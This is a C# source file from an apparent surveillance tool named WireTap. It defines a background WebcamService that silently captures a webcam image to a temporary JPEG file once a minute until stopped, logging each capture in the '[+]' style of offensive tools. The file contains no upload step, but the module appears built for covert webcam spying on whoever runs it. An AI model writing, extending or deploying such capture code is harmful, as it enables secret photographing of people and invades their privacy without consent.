namespace WireTap.HostedService
{
    using Microsoft.Extensions.Hosting;
    using System;
    using System.Threading;
    using System.Threading.Tasks;
    using WireTap.Logging;

    internal class WebcamService : ServiceBase, IHostedService
    {
        private readonly ILogger _logger;

        public WebcamService(ILogger logger) : base(logger)
        {
            _logger = logger;
        }

        protected override async Task InternalExecuteAsync(CancellationToken cancellationToken)
        {
            Console.WriteLine("WebcamService : StartWebCameraServiceAsync");
            _logger.LogInformation("WebcamService : StartWebCameraServiceAsync");

            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    Console.WriteLine("WebcamService : Inside captureWebCam");
                    _logger.LogInformation("WebcamService : Inside captureWebCam");

                    var filename = Helpers.CreateTempFileName(".jpeg", "webcam-", "webcam");
                    WebCam.CaptureImage(filename);

                    Console.WriteLine("WebcamService : [+] Webcam captured at: {0}", filename);
                    _logger.LogInformation("WebcamService : [+] Webcam captured at: {0}", filename);

                    await Task.Delay(TimeSpan.FromMinutes(1));
                }
                catch (Exception ex)
                {
                    Console.WriteLine(string.Concat("WebcamService : ", ex.Message, '\n' + ex.StackTrace));
                    _logger.LogError(ex);

                    await Task.Delay(TimeSpan.FromMinutes(1));
                }
            }
        }
    }
}
